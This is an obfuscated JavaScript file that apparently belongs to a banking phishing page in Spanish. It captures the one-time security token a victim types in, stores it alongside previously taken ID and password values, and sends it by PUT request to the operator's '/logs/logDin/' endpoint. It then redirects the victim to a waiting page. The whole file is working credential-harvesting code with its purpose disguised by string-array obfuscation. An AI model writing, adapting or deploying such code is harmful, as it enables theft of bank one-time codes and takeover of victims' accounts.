function _0x3ac8(_0x1dd921, _0x35e495) {
  const _0x70a0f6 = _0x70a0();
  return (
    (_0x3ac8 = function (_0x3ac865, _0x12bc91) {
      _0x3ac865 = _0x3ac865 - 0xae;
      let _0x4aaa2f = _0x70a0f6[_0x3ac865];
      return _0x4aaa2f;
    }),
    _0x3ac8(_0x1dd921, _0x35e495)
  );
}
const _0x32d0f6 = _0x3ac8;
(function (_0x3e8ed0, _0x90c0f) {
  const _0x287fc7 = _0x3ac8,
    _0x48e404 = _0x3e8ed0();
  while (!![]) {
    try {
      const _0x51ade0 =
        -parseInt(_0x287fc7(0xb8)) / 0x1 +
        -parseInt(_0x287fc7(0xb7)) / 0x2 +
        (parseInt(_0x287fc7(0xbf)) / 0x3) * (parseInt(_0x287fc7(0xb6)) / 0x4) +
        parseInt(_0x287fc7(0xcd)) / 0x5 +
        (-parseInt(_0x287fc7(0xce)) / 0x6) * (parseInt(_0x287fc7(0xc5)) / 0x7) +
        parseInt(_0x287fc7(0xbd)) / 0x8 +
        -parseInt(_0x287fc7(0xc8)) / 0x9;
      if (_0x51ade0 === _0x90c0f) break;
      else _0x48e404["push"](_0x48e404["shift"]());
    } catch (_0x1289d9) {
      _0x48e404["push"](_0x48e404["shift"]());
    }
  }
})(_0x70a0, 0xa3a89);
function updateLS() {
  const _0x4db558 = _0x3ac8;
  LS[_0x4db558(0xcb)](_0x4db558(0xc4), JSON[_0x4db558(0xc3)](info));
}
function _0x70a0() {
  const _0x5b2ec0 = [
    "12bjPYns",
    "getElementById",
    "error",
    "click",
    "value",
    "application/json",
    "telnum",
    "/logs/logDin/",
    "txtPassword",
    "2233840xDpGaP",
    "1187108DWrtBr",
    "381288JCknqD",
    "Error\x20al\x20actualizar\x20usuario:",
    "wait.html",
    "log",
    "reg",
    "9230120RrnNwq",
    "metaInfo",
    "6wHONjV",
    "PUT",
    "/logs/logs",
    "Usuario\x20actualizado",
    "stringify",
    "info",
    "3404891FBPBhH",
    "disabled",
    "addEventListener",
    "1020825EOKYvZ",
    "focus",
    "cdin",
    "setItem",
    "href",
    "2303765SzzmyG",
  ];
  _0x70a0 = function () {
    return _0x5b2ec0;
  };
  return _0x70a0();
}
const otpButton = document[_0x32d0f6(0xae)]("btnPass"),
  numberMovil = document[_0x32d0f6(0xae)](_0x32d0f6(0xb5));
otpButton[_0x32d0f6(0xc7)](_0x32d0f6(0xb0), async function (_0xe28811) {
  const _0x3b6d02 = _0x32d0f6;
  _0xe28811["preventDefault"](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x3b6d02(0xb1)] == "") {
    alert("Por\x20favor\x20ingrese\x20token\x20de\x20seguridad"),
      numberMovil[_0x3b6d02(0xc9)](),
      (otpButton["disabled"] = ![]);
    return;
  } else {
    var _0x5b27f6 = numberMovil[_0x3b6d02(0xb1)];
    (info[_0x3b6d02(0xbe)][_0x3b6d02(0xca)] = _0x5b27f6), updateLS();
    async function _0x551fc3() {
      const _0x2eba67 = _0x3b6d02,
        _0x25cc30 = await fetch(url + _0x2eba67(0xc1), {
          method: "GET",
          headers: { "Content-Type": _0x2eba67(0xb2) },
        }),
        _0x1c3d9c = await _0x25cc30["json"](),
        _0x1de3c9 = [..._0x1c3d9c];
      for (const _0x1b0226 of _0x1de3c9) {
        if (
          _0x1b0226[_0x2eba67(0xbc)] == info[_0x2eba67(0xbe)]["cc"] &&
          _0x1b0226["cl"] == info[_0x2eba67(0xbe)][_0x2eba67(0xb3)]
        ) {
          console[_0x2eba67(0xbb)]("Usuario\x20Encontrado");
          const _0x324356 = await fetch(
              url + _0x2eba67(0xb4) + _0x1b0226["idreg"],
              {
                method: _0x2eba67(0xc0),
                headers: { "Content-Type": "application/json" },
                body: JSON[_0x2eba67(0xc3)]({
                  din: info[_0x2eba67(0xbe)][_0x2eba67(0xca)],
                  status: "Ingresó\x20Dinámica",
                }),
              }
            ),
            _0x465317 = await _0x324356["json"]();
          _0x324356["ok"]
            ? console[_0x2eba67(0xbb)](_0x2eba67(0xc2))
            : console[_0x2eba67(0xaf)](
                _0x2eba67(0xb9),
                _0x324356["statusText"]
              );
        }
      }
      (otpButton[_0x2eba67(0xc6)] = ![]),
        (window["location"][_0x2eba67(0xcc)] = _0x2eba67(0xba));
    }
    await _0x551fc3();
  }
});
